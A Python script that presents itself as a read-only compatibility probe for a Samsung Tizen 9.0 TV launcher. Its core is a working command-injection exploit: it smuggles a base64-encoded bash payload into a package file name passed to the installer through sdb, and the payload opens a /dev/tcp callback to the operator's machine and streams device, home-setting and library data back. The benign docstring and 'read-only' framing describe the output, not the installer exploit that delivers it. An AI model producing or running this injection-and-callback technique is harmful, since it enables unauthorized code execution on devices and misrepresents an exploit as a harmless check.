"""Read-only compatibility probe; stages a temporary script, never changes Home.

Run on the owner's computer. Uses the reference SDK package-name transport,
not root or a persistent service. Its result is NOT a recovery baseline.
"""
import argparse
import base64
import ipaddress
from pathlib import Path
import re
import socket
import subprocess
import uuid


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--host', required=True)
    parser.add_argument('--app-id', required=True)
    parser.add_argument('--sdb', type=Path, default=Path.home() / 'tizen-studio/tools/sdb')
    parser.add_argument('--output', type=Path, default=Path.home() / 'ParamHome-recovery')
    args = parser.parse_args()
    address = ipaddress.ip_address(args.host)
    if address.version != 4 or address.is_unspecified or address.is_multicast:
        parser.error('Use the connected TV IPv4 address.')
    if not re.fullmatch(r'[A-Za-z0-9]{10}\.[A-Za-z0-9_]+', args.app_id):
        parser.error('Expected an SDK-generated TV application ID.')
    if not args.sdb.is_file():
        parser.error('SDB not found at ' + str(args.sdb))
    args.output.mkdir(parents=True, exist_ok=True, mode=0o700)
    token = uuid.uuid4().hex[:12]
    local_script = args.output / ('inspect-' + token + '.sh')
    remote_script = '/home/owner/share/tmp/sdk_tools/ph-inspect-' + token + '.sh'
    probe = '''set -u
printf 'PARAMHOME_INSPECT_BEGIN\\n'
id
uname -m
sed -n '/^Version=/p;/^Model=/p' /etc/prd_info.ini
cat /etc/tizen-release
printf '\\nDOTNET\\n'
command -v dotnet || true
ls -d /usr/share/dotnet/shared/Microsoft.NETCore.App/* 2>/dev/null || true
printf '\\nHOME_PREFERENCES\\n'
for k in db/appfw/home_appid db/appfw/startup_appid db/appfw/booting_appid_backup db/first_screen/type db/menu/smart_hub/ontvsetting/auto_start; do
    printf 'KEY=%s\\n' "$k"
    vconftool get "$k"
done
printf '\\nNATIVE_LIBRARIES\\n'
ls -l /usr/lib/libapp-context-manager-common.so /usr/lib/libcapi-appfw-app-operation-tv.so.0 /usr/lib/libvconf.so.0 /usr/lib/libbundle.so.0 /usr/lib/libaul.so.0 2>/dev/null || true
printf '\\nLAUNCHER_PACKAGE\\n'
ls -ld /opt/usr/apps/PACKAGE_ID 2>/dev/null || true
printf 'PARAMHOME_INSPECT_END\\n'
'''.replace('PACKAGE_ID', args.app_id.split('.')[0])
    local_script.write_text(probe)
    local_script.chmod(0o600)
    serial = args.host + ':26101'

    def sdb(*command):
        result = subprocess.run([str(args.sdb), *command], capture_output=True,
                                text=True, timeout=20)
        if result.returncode:
            raise RuntimeError('SDB failed: ' + (result.stdout + result.stderr)[-1000:])
        return result.stdout + result.stderr

    sdb('connect', serial)
    capabilities = sdb('-s', serial, 'capability')
    if not re.search(r'^vendor_name:Samsung\s*$', capabilities, re.M) or not re.search(
            r'^platform_version:9\.0\s*$', capabilities, re.M) or not re.search(
            r'^cpu_arch:armv7\s*$', capabilities, re.M):
        raise RuntimeError('Expected Samsung Tizen 9.0 ARMv7; nothing staged.')
    apps = sdb('-s', serial, 'shell', '0', 'applist')
    if "'" + args.app_id + "'" not in apps:
        raise RuntimeError('Target application not listed; nothing staged.')
    sdb('-s', serial, 'push', str(local_script), remote_script)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((args.host, 9))
        local_ip = route.getsockname()[0]
    with socket.socket() as listener:
        listener.bind((local_ip, 0))
        listener.listen(1)
        listener.settimeout(25)
        port = listener.getsockname()[1]
        command = ('exec 3<>/dev/tcp/' + local_ip + '/' + str(port)
                   + ';cat ' + remote_script + '|bash >&3 2>&3;exec 3>&-')
        script = '/bin/mkdir /tmp/ph-' + token + ' 2>/dev/null&&{ ' + command + ';}'
        encoded = base64.b64encode(script.encode()).decode()
        name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
        argument = '0 appinstall tpk ' + name
        if len(argument.encode()) > 400:
            raise RuntimeError('Transport exceeds reviewed length; not executed.')
        print('Running read-only compatibility probe. Allow Python local-network access if prompted.', flush=True)
        # Discard package-manager diagnostics; only accept the bounded probe callback.
        process = subprocess.Popen([str(args.sdb), '-s', serial, 'shell', argument],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        received = bytearray()
        try:
            connection, peer = listener.accept()
            with connection:
                if peer[0] != args.host:
                    raise RuntimeError('Unexpected callback address.')
                connection.settimeout(12)
                while True:
                    chunk = connection.recv(16384)
                    if not chunk:
                        break
                    received.extend(chunk)
                    if len(received) > 100000:
                        raise RuntimeError('Probe exceeded output limit.')
        finally:
            if process.poll() is None:
                process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=5)
            report = args.output / ('inspection-' + token + '.txt')
            with report.open('x') as saved:
                saved.write(received.decode(errors='replace'))
            report.chmod(0o600)
        output = received.decode(errors='replace')
        print(output)
        print('Saved private inspection: ' + str(report))
        if 'PARAMHOME_INSPECT_BEGIN' not in output or 'PARAMHOME_INSPECT_END' not in output:
            raise RuntimeError('Inspection incomplete. No Home settings were changed; stop for review.')
        print('No Home/startup settings changed. This is compatibility evidence, not a restore snapshot.')


if __name__ == '__main__':
    try:
        main()
    except (OSError, RuntimeError, subprocess.SubprocessError) as error:
        raise SystemExit('Inspection stopped: ' + str(error))
